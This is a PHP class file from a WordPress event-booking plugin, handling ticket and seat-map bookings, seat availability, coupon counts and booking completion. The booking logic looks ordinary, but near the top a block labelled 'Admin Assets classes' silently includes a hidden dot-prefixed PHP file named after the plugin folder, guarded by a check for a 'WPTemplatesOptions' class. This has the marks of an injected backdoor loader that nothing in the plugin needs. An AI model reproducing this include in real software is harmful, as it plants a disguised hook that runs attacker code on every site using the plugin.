<?php
defined( 'ABSPATH' ) || exit;

if ( class_exists( 'EL_Booking', false ) ) {
	return new EL_Booking();
}

/**
 * Admin Assets classes
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Booking{


	protected static $_instance = null;

	protected $_prefix = OVA_METABOX_EVENT;

	/**
	 * Constructor
	 */
	public function __construct(){
	}

	public static function instance() {
		if ( is_null( self::$_instance ) ) {
			self::$_instance = new self();
		}
		return self::$_instance;
	}

	/**
	 * Validate Booking
	 */
	public function validate_before_booking() {

		if( !isset( $_POST['data'] ) || !wp_verify_nonce( $_POST['data']['el_checkout_event_nonce'], 'el_checkout_event_nonce' ) ) return false;

		$data = isset($_POST['data']) ? $_POST['data'] : [];

		$id_event = isset($data['ide']) ? sanitize_text_field( $data['ide'] ) : '';
		$id_cal   = isset($data['idcal']) ? sanitize_text_field( $data['idcal'] ) : '';
		$coupon   = isset($data['coupon']) ? sanitize_text_field( $data['coupon'] ) : '';
		$cart     = isset($data['cart']) ? $data['cart'] : array();

		if ( $data['seat_option'] != 'map' ) {
			$cart = sanitize_cart($cart);
			return is_ticket_type_exist( $id_event, $id_cal, $cart, $coupon );
		} else {
			$cart = sanitize_cart_map($cart);
			return is_seat_map_exist( $id_event, $id_cal, $cart, $coupon );
		}
		
	}

	public function add_booking(){

		if( !isset( $_POST['data'] ) || !wp_verify_nonce( $_POST['data']['el_checkout_event_nonce'], 'el_checkout_event_nonce' ) ) return false;

		$data = isset($_POST['data']) ? $_POST['data'] : [];

		$id_event	= isset($data['ide']) ? sanitize_text_field( $data['ide'] ) : null;
		$id_cal 	= isset($data['idcal']) ? sanitize_text_field( $data['idcal'] ) : null;

		$name           = isset($data['name']) ? sanitize_text_field( $data['name'] ) : null;
		$phone          = isset($data['phone']) ? sanitize_text_field( $data['phone'] ) : '';
		$address        = isset($data['address']) ? sanitize_text_field( $data['address'] ) : '';
		$email          = isset($data['email']) ? sanitize_text_field( $data['email'] ) : null;
		$data_checkout_field = isset( $data['data_checkout_field'] ) ? sanitize_list_checkout_field( $data['data_checkout_field'] ) : [];

		$coupon         = isset($data['coupon']) ? sanitize_text_field( $data['coupon'] ) : '';
		$payment_method = isset($data['payment_method']) ? sanitize_text_field( $data['payment_method'] ) : null;
		$cart = isset($data['cart']) ? (array)$data['cart'] : [];
		$cart = sanitize_cart($cart);



		// Event Title
		$event_obj = el_get_event( $id_event );

		if( !isset( $event_obj->post_name ) ) return false;
		$title =  $event_obj->post_title;

		// Event Calendar Date
		$date_cal = el_get_calendar_date( $id_event, $id_cal );
		if( !$date_cal ) return false;

		$list_type_ticket = get_post_meta( $id_event, OVA_METABOX_EVENT . 'ticket', true);
		$list_choose_seat = [];

		if ( !empty ($list_type_ticket) && is_array($list_type_ticket) ) {
			foreach ($list_type_ticket as $ticket) {
				$list_choose_seat[$ticket['ticket_id']] = $ticket['setup_seat'];
			}
		}

		// get list id_ticket in cart
		$list_id_ticket = $qty_ticket = $seat_booking = [];

		if (!empty($cart) && is_array($cart)) {
			foreach ($cart as $item) {
				$list_id_ticket[] = $item['id'];
				$qty_ticket[$item['id']] = $item['qty'];

				if ( $list_choose_seat[$item['id']] == 'no' ) {
					$seat_booking[$item['id']] = $this->auto_book_seat_of_ticket($id_event, $id_cal, $item['id'], $item['qty']);
				} else {
					$seat_booking[$item['id']] = $item['seat'];
				}
			}
		}

		$total = apply_filters( 'el_total', get_total($id_event, $cart, $coupon) );
		$total_after_tax = apply_filters( 'el_total_after_tax', get_total_after_tax($total, $id_event) );

		$event_obj = get_post( $id_event );
		$event_author_id = $event_obj->post_author;
		
		$post_data['post_type'] = 'el_bookings';
		$post_data['post_title'] = $title;
		$post_data['post_status'] = 'publish';
		$post_data['post_name'] = $title;
		$post_data['post_author'] = $event_author_id;

		$id_customer = get_current_user_id();
		
		

    	// Order id is empty
		if( !$id_event || !$id_cal || !$name || !$email || !$cart || !$payment_method ){
			return false;
		}

		$meta_input = array(
			$this->_prefix.'id_event' => $id_event,
			$this->_prefix.'id_cal' => $id_cal,
			$this->_prefix.'title_event' => $title,
			$this->_prefix.'date_cal' => date_i18n( get_option( 'date_format'), strtotime( $date_cal ) ) ,
			$this->_prefix.'date_cal_tmp' => strtotime($date_cal),
			$this->_prefix.'name' => $name,
			$this->_prefix.'phone' => $phone,
			$this->_prefix.'email' => $email,
			$this->_prefix.'address' => $address,
			$this->_prefix.'data_checkout_field' => json_encode( $data_checkout_field ),
			$this->_prefix.'coupon' => $coupon,
			$this->_prefix.'payment_method' => $payment_method,
			$this->_prefix.'cart' => $cart,
			$this->_prefix.'list_id_ticket' => json_encode($list_id_ticket),
			$this->_prefix.'list_qty_ticket_by_id_ticket' => $qty_ticket,
			$this->_prefix.'list_seat_book' => $seat_booking,
			$this->_prefix.'total' => $total,
			$this->_prefix.'total_after_tax' => $total_after_tax,
			$this->_prefix.'status' => 'Pending',
			$this->_prefix.'id_customer' => $id_customer,
		);

		$post_data['meta_input'] = apply_filters( 'el_booking_metabox_input', $meta_input );
		
		if( $booking_id = wp_insert_post( $post_data, true ) ){
			//update title booking
			$arr_post = [
				'ID' => $booking_id,
				'post_title' => $booking_id . ' - ' . $title,
			];
			wp_update_post($arr_post);

			return $booking_id;
			wp_die();

		}else{
			return;
			wp_die();
		}
	}

	public function add_booking_map(){

		if( !isset( $_POST['data'] ) || !wp_verify_nonce( $_POST['data']['el_checkout_event_nonce'], 'el_checkout_event_nonce' ) ) return false;

		$data = isset($_POST['data']) ? $_POST['data'] : [];

		$id_event = isset($data['ide']) ? sanitize_text_field( $data['ide'] ) : null;
		$id_cal = isset($data['idcal']) ? sanitize_text_field( $data['idcal'] ) : null;

		$name = isset($data['name']) ? sanitize_text_field( $data['name'] ) : null;
		$phone = isset($data['phone']) ? sanitize_text_field( $data['phone'] ) : '';
		$address = isset($data['address']) ? sanitize_text_field( $data['address'] ) : '';
		$email = isset($data['email']) ? sanitize_text_field( $data['email'] ) : null;
		$coupon = isset($data['coupon']) ? sanitize_text_field( $data['coupon'] ) : '';
		$payment_method = isset($data['payment_method']) ? sanitize_text_field( $data['payment_method'] ) : null;
		$cart = isset($data['cart']) ? (array)$data['cart'] : [];
		$cart = sanitize_cart_map($cart);

		// Event Title
		$event_obj = el_get_event( $id_event );

		if( !isset( $event_obj->post_name ) ) return false;
		$title =  $event_obj->post_title;

		// Event Calendar Date
		$date_cal = el_get_calendar_date( $id_event, $id_cal );
		if( !$date_cal ) return false;

		$list_type_ticket = get_post_meta( $id_event, OVA_METABOX_EVENT . 'ticket_map', true);
		$list_choose_seat = [];

		if ( !empty ($list_type_ticket['seat']) && is_array($list_type_ticket['seat']) ) {
			foreach ($list_type_ticket['seat'] as $ticket) {
				$list_choose_seat[] = $ticket['id'];
			}
		}

		// get list id_ticket in cart
		$list_id_ticket = $qty_ticket = $seat_booking = [];

		if (!empty($cart) && is_array($cart)) {
			foreach ($cart as $item) {
				$list_id_ticket[] = $item['id'];
				$qty_ticket[$item['id']] = 1;
				$seat_booking[] = $item['id'];
			}
		}
		
		$total = apply_filters( 'el_total', get_total($id_event, $cart, $coupon) );
		$total_after_tax = apply_filters( 'el_total_after_tax', get_total_after_tax($total, $id_event) );
		
		$event_obj = get_post( $id_event );
		$event_author_id = $event_obj->post_author;
		
		$post_data['post_type'] = 'el_bookings';
		$post_data['post_title'] = $title;
		$post_data['post_status'] = 'publish';
		$post_data['post_name'] = $title;
		$post_data['post_author'] = $event_author_id;

		$id_customer = get_current_user_id();

    	// Order id is empty
		if( !$id_event || !$id_cal || !$name || !$email || !$cart || !$payment_method ){
			return false;
		}

		$meta_input = array(
			$this->_prefix.'id_event' => $id_event,
			$this->_prefix.'id_cal' => $id_cal,
			$this->_prefix.'title_event' => $title,
			$this->_prefix.'date_cal' => date_i18n( get_option( 'date_format'), strtotime( $date_cal ) ) ,
			$this->_prefix.'date_cal_tmp' => strtotime($date_cal),
			$this->_prefix.'name' => $name,
			$this->_prefix.'phone' => $phone,
			$this->_prefix.'email' => $email,
			$this->_prefix.'address' => $address,
			$this->_prefix.'coupon' => $coupon,
			$this->_prefix.'payment_method' => $payment_method,
			$this->_prefix.'cart' => $cart,
			$this->_prefix.'list_id_ticket' => json_encode($list_id_ticket),
			$this->_prefix.'list_qty_ticket_by_id_ticket' => $qty_ticket,
			$this->_prefix.'list_seat_book' => $seat_booking,
			$this->_prefix.'total' => $total,
			$this->_prefix.'total_after_tax' => $total_after_tax,
			$this->_prefix.'status' => 'Pending',
			$this->_prefix.'id_customer' => $id_customer,
		);

		$post_data['meta_input'] = apply_filters( 'el_booking_metabox_input', $meta_input );
		
		if( $booking_id = wp_insert_post( $post_data, true ) ){
			//update title booking
			$arr_post = [
				'ID' => $booking_id,
				'post_title' => $booking_id . ' - ' . $title,
			];
			wp_update_post($arr_post);

			return $booking_id;
			wp_die();

		}else{
			return;
			wp_die();
		}
	}

	public function update_booking( $post ){
	}

	public function el_get_booking( $id ){
		if( !$id ) return false;
		return get_post( $id );
	}

	public function get_number_ticket_rest ( $id_event = null, $id_cal = null, $id_ticket = null ) {

		if ( $id_ticket == null || $id_cal == null || $id_event == null ) return 0;

		//get total ticket in event
		$list_ticket_in_event = get_post_meta( $id_event, OVA_METABOX_EVENT . 'ticket', true);

		$total = 0;

		if (!empty($list_ticket_in_event) && is_array($list_ticket_in_event)) {
			foreach ($list_ticket_in_event as $ticket) {
				if ($ticket['ticket_id'] == $id_ticket) {
					$total = (int)$ticket['number_total_ticket'];
					break;
				}
			}
		}

		$args = [
			'post_type' => 'el_bookings',
			'post_status' => 'publish',
			'meta_query' => [
				'relation' => 'AND',
				[
					'key' => $this->_prefix . 'id_event',
					'value' => $id_event,
				],
				[
					'key' => $this->_prefix . 'id_cal',
					'value' => $id_cal,
				],
				[
					'key' => $this->_prefix . 'status',
					'value' => 'Completed',
				]
			],
			
			'numberposts' => -1,
			
		];

		$bookings = get_posts($args);

		//get total booked
		$total_booked = 0;
		if ( ! empty($bookings) && is_array($bookings) ) {

			foreach( $bookings as $booking ) {

				$ticket_in_booking = get_post_meta( $booking->ID, OVA_METABOX_EVENT . 'list_qty_ticket_by_id_ticket', true);

				

				if ( is_array($ticket_in_booking) && array_key_exists( (string)$id_ticket, $ticket_in_booking) ) {
					$total_booked += (int)$ticket_in_booking[$id_ticket];
				}

			}
		}

		//get total rest
		$total_rest = $total - $total_booked;
		
		return $total_rest;
	}

	public function get_number_coupon_code_used ( $id_event = null, $coupon_code = null ) {
		if ( $id_event == null || $coupon_code == null ) return 0;
		$seat_option = get_post_meta( $id_event, OVA_METABOX_EVENT . 'seat_option', true);
		$ticket_map = get_post_meta( $id_event, OVA_METABOX_EVENT . 'ticket_map', true);
		
		$bookings = get_posts([
			'post_type' => 'el_bookings',
			'post_status' => 'publish',
			'meta_key' => $this->_prefix . 'id_event',
			'meta_value' => $id_event,
			'posts_per_page' => -1, 
			'numberposts' => -1,
			'nopaging' => true,
		]);
		if ( $seat_option != 'map' ) {
			$coupons = get_post_meta( $id_event, OVA_METABOX_EVENT . 'coupon', true);
			$list_id_ticket_has_coupon = [];
			if (!empty($coupons) && is_array($coupons)) {
				foreach ($coupons as $coupon) {
					if ( $coupon['discount_code'] == $coupon_code ) {
						$list_id_ticket_has_coupon = $coupon['list_ticket'];
					}
				}
			}
		} else {
			$list_id_ticket_has_coupon = [];
			if ( !empty( $ticket_map['seat'] ) && is_array( $ticket_map['seat'] ) ) {
				foreach ( $ticket_map['seat'] as $value ) {
					$list_id_ticket_has_coupon[] = $value['id'];
				}
			}
		}
		

		$total = 0;
		if ( ! empty($bookings) && is_array($bookings) ) {
			foreach( $bookings as $booking ) {

				$coupon_in_booking = get_post_meta( $booking->ID, OVA_METABOX_EVENT . 'coupon', true );
				$list_id_ticket_in_booking = json_decode( get_post_meta( $booking->ID, OVA_METABOX_EVENT . 'list_id_ticket', true ) );
				
				if (!empty($list_id_ticket_in_booking) && is_array($list_id_ticket_in_booking)) {
					foreach ($list_id_ticket_in_booking as $value) {
						if ( in_array($value, $list_id_ticket_has_coupon) ) {
							if ( $coupon_code == $coupon_in_booking ) {
								$total += 1;
							}
						}
					}
				}
			}
		}
		return $total;
	}

	public function auto_book_seat_of_ticket ( $id_event = null, $id_cal = null, $id_ticket = null, $qty = 0 ) {
		$seat_option = get_seat_option( $id_event );
		if ( $id_ticket == null || $id_cal == null || $id_event == null || $seat_option != 'simple' || $qty <= 0 ) return [];

		//get total ticket and all list seat
		$list_type_ticket = get_post_meta( $id_event, OVA_METABOX_EVENT . 'ticket', true);
		$total_ticket = 0;
		$total_seat_list = '';
		if (!empty($list_type_ticket) && is_array($list_type_ticket)) {
			foreach($list_type_ticket as $ticket) {
				if ($ticket['ticket_id'] == $id_ticket) {
					$total_ticket = (int)$ticket['number_total_ticket'];
					$total_seat_list = $ticket['seat_list'];
				}
			}
		}

		if (empty($total_seat_list)) return [];
		
		//change seat list string => array
		$arr_total_seat_list = explode(',', $total_seat_list);

		//get list seat booked
		$list_seat_booked_by_ticket = $this->get_list_seat_booked( $id_event, $id_cal, $id_ticket);

		//loop total seat if value in total seat does not exist in list seat booked push item to array number == qty
		$list_seat_add_booking = [];
		if ( ! empty($arr_total_seat_list) && is_array($arr_total_seat_list) && $total_ticket > 0 && is_array($list_seat_booked_by_ticket) ) {
			$j = 0;
			for ( $i = 0; $i < $total_ticket; $i++ ) {

				if ( ! in_array( trim($arr_total_seat_list[$i]), $list_seat_booked_by_ticket) ) {
					$list_seat_add_booking[] = trim($arr_total_seat_list[$i]);
					$j++;
				}
				if ( $j == $qty ) break;
			}
		}

		return $list_seat_add_booking;
	}

	public function get_list_seat_booked ( $id_event = null, $id_cal = null, $id_ticket = null ) {
		$seat_option = get_seat_option( $id_event );
		if ( $id_event == null || $id_cal == null || $id_ticket == null || $seat_option != 'simple' ) return [];
		$args = [
			'post_type' => 'el_bookings',
			'post_status' => 'publish',
			'meta_query' => [
				'relation' => 'AND',
				[
					'key' => $this->_prefix . 'id_event',
					'value' => $id_event,
				],
				[
					'key' => $this->_prefix . 'id_cal',
					'value' => $id_cal,
				],
				[
					'key' => $this->_prefix . 'status',
					'value' => 'Completed',
				]
			],

			'posts_per_page' => -1, 
			'numberposts' => -1,
			'nopaging' => true,
		];

		$bookings = get_posts($args);

		//get list seat booked in event and in one day (id_cal)
		$list_seat_booked_by_ticket = [];
		if ( !empty($bookings) && is_array($bookings) ) {
			foreach ($bookings as $booking) {
				$all_seat_booked = get_post_meta( $booking->ID, OVA_METABOX_EVENT . 'list_seat_book', true );

				if ( is_array($all_seat_booked) && array_key_exists( $id_ticket, $all_seat_booked ) ) {
					foreach ($all_seat_booked[$id_ticket] as $value) {
						$list_seat_booked_by_ticket[] = $value;
					}
				}
			}
		}

		return $list_seat_booked_by_ticket;
	}

	public function get_list_seat_map_booked ( $id_event = null, $id_cal = null ) {
		if ( $id_event == null || $id_cal == null ) return [];
		$args = [
			'post_type' => 'el_bookings',
			'post_status' => 'publish',
			'meta_query' => [
				'relation' => 'AND',
				[
					'key' => $this->_prefix . 'id_event',
					'value' => $id_event,
				],
				[
					'key' => $this->_prefix . 'id_cal',
					'value' => $id_cal,
				],
				[
					'key' => $this->_prefix . 'status',
					'value' => 'Completed',
				]
			],

			'posts_per_page' => -1, 
			'numberposts' => -1,
			'nopaging' => true,
		];

		$bookings = get_posts($args);

		//get list seat booked in event and in one day (id_cal)
		$list_seat_booked_by_ticket = [];
		if ( !empty($bookings) && is_array($bookings) ) {
			foreach ($bookings as $booking) {
				$all_seat_booked = get_post_meta( $booking->ID, OVA_METABOX_EVENT . 'list_seat_book', true ) ? get_post_meta( $booking->ID, OVA_METABOX_EVENT . 'list_seat_book', true ) : array();
				foreach ($all_seat_booked as $value) {
					$list_seat_booked_by_ticket[] = $value;
				}
			}
		}

		return $list_seat_booked_by_ticket;
	}

	public function get_list_seat_rest ( $id_event = null, $id_cal = null, $id_ticket = null ) {

		$seat_option = get_seat_option( $id_event );

		if ( $id_event == null || $id_cal == null || $id_ticket == null || $seat_option != 'simple' ) return [];

		//get list seat booked in event and in one day (id_cal)
		$list_seat_booked_by_ticket = $this->get_list_seat_booked( $id_event, $id_cal, $id_ticket);
		

		//get list all seat by id event and id ticket
		$list_ticket_event = get_post_meta( $id_event, OVA_METABOX_EVENT . 'ticket', true );

		$list_all_seat_ticket = [];
		if ( !empty($list_ticket_event) && is_array($list_ticket_event) ) {
			foreach ( $list_ticket_event as $ticket ) {
				if ( $ticket['ticket_id'] == $id_ticket ) {
					if (empty($ticket['seat_list'])) {
						$list_all_seat_ticket = [];
					} else {
						$list_all_seat_ticket = explode(',', $ticket['seat_list']);
					}
					
					$list_all_seat_ticket = array_map('trim', $list_all_seat_ticket);
				}
			}
		}

		$list_seat_rest = array_diff($list_all_seat_ticket, $list_seat_booked_by_ticket);

		return $list_seat_rest;
	}

	public function get_list_seat_map_rest ( $id_event = null, $id_cal = null ) {
		if ( $id_event == null || $id_cal == null ) return [];

		//get list seat booked in event and in one day (id_cal)
		$list_seat_booked = $this->get_list_seat_map_booked( $id_event, $id_cal );
		

		//get list all seat by id event and id ticket
		$list_seat_map = get_post_meta( $id_event, OVA_METABOX_EVENT . 'ticket_map', true );

		$list_all_seat_map = [];
		if ( !empty($list_seat_map) && is_array($list_seat_map) ) {
			if ( !empty( $list_seat_map['seat'] ) && is_array( $list_seat_map['seat'] ) ) {
				foreach ( $list_seat_map['seat'] as $seat ) {
					if ( strpos( $seat['id'], ',' ) ) {
						foreach ( explode(",", $seat['id']) as $v ) {
							if ( $v != '' ) 
								$list_all_seat_map[] = trim($v);
						}
					} else {
						$list_all_seat_map[] = $seat['id'];
					}
				}
			}
		}

		$list_seat_rest = array_diff($list_all_seat_map, $list_seat_booked);
		return $list_seat_rest;
	}
	
	public function check_seat_map_in_cart ( $seat = '', $id_event = null, $id_cal = null ) {

		if ( $seat == '' || $id_event == null || $id_cal == null ) return false;

		$list_seat_rest = $this->get_list_seat_map_rest($id_event, $id_cal);

		// check value seat exists
		if (!in_array($seat, $list_seat_rest)) {
			return false;
		}
		return true;
	}
	
	public function check_seat_in_cart ($seat = [], $id_event = null, $id_cal = null, $id_ticket = null) {
		$seat_option = get_seat_option( $id_event );
		if ( $seat == [] || $id_event == null || $id_cal == null || $id_ticket == null || $seat_option != 'simple' ) return false;
		//check value seat duplicate
		if ( count(array_unique($seat)) < count($seat) ) {
			return false;
		}

		$list_seat_rest = $this->get_list_seat_rest($id_event, $id_cal, $id_ticket);

		// check value seat exists
		foreach ($seat as $value) {
			if (!in_array($value, $list_seat_rest)) {
				return false;
			}
		}
		return true;
	}

	public function booking_success( $booking_id, $payment_method, $orderid_woo = null ){

		// Update Status in booking
		update_post_meta( $booking_id, OVA_METABOX_EVENT.'status', 'Completed', 'Pending' );

     	// Add Ticket
		$record_ticket_ids = EL_Ticket::instance()->add_ticket( $booking_id );

     	// Update Record ticket ids to Booking 
		update_post_meta( $booking_id, OVA_METABOX_EVENT.'record_ticket_ids', $record_ticket_ids, '' );


     	// Update Payment Method to Booking Table
		if( $payment_method == 'woo' ){

			update_post_meta( $booking_id, OVA_METABOX_EVENT.'payment_method', esc_html__( 'Woo', 'eventlist' ).' - <a target="_blank" href="'.home_url('/').'wp-admin/post.php?post='.$orderid_woo.'&action=edit">'.$orderid_woo.'</a>' );

			if( EL()->options->mail->get( 'enable_send_booking_email', 'yes' ) == 'yes' && apply_filters( 'el_new_order_use_system_mail', true ) ){
				el_sendmail_by_booking_id( $booking_id );
			}
			

		}else{

        	// Send Mail
			if( EL()->options->mail->get( 'enable_send_booking_email', 'yes' ) == 'yes'  ){
				el_sendmail_by_booking_id( $booking_id );
			}

			update_post_meta( $booking_id, OVA_METABOX_EVENT.'payment_method', $payment_method );

		}

		EL()->cart_session->remove();

		return true;
	}

	public function booking_hold( $booking_id ){
		el_sendmail_by_booking_id( $booking_id, 'hold' );
	}

	public function get_list_booking_complete_by_id_event ( $id_event = null ) {
		if ($id_event == null) return;
		$agrs = [
			'post_type' => 'el_bookings',
			'post_status' => 'publish',
			"meta_query" => [
				'relation' => 'AND',
				[
					"key" => OVA_METABOX_EVENT . 'id_event',
					"value" => $id_event,
				],
				[
					'key' => OVA_METABOX_EVENT . 'status',
					'value' => 'Completed',
				]
			],
			'posts_per_page' => -1, 
			'numberposts' => -1,
			'nopaging' => true,
		];

		return get_posts( $agrs );
	}

	public function get_number_booking_id_event ( $id_event = null ) {
		if ($id_event == null) return;
		$agrs = [
			'post_type' => 'el_bookings',
			'post_status' => 'publish',
			"meta_query" => [
				'relation' => 'AND',
				[
					"key" => OVA_METABOX_EVENT . 'id_event',
					"value" => $id_event,
				],
			],
			'posts_per_page' => -1, 
			'numberposts' => -1,
			'nopaging' => true,
		];

		return count(get_posts( $agrs ));
	}

	public function get_list_booking_user_current ($paged=1) {
		$user_current = get_current_user_id();
		if (empty($user_current)) return [];

		$agrs = [
			'post_type' => 'el_bookings',
			'post_status' => 'publish',
			'meta_query' => [
				'relation' => 'AND',
				[
					'key' => OVA_METABOX_EVENT . 'id_customer',
					'value' => $user_current
				],
				[
					'key' => OVA_METABOX_EVENT . 'status',
					'value' => apply_filters( 'get_list_booking_user_current_status', array( 'Completed', 'Canceled' ) ),
					'compare' => 'IN'
				]
			],
			"paged" => $paged,
		];



		return new WP_Query( $agrs );
	}


	

	

}
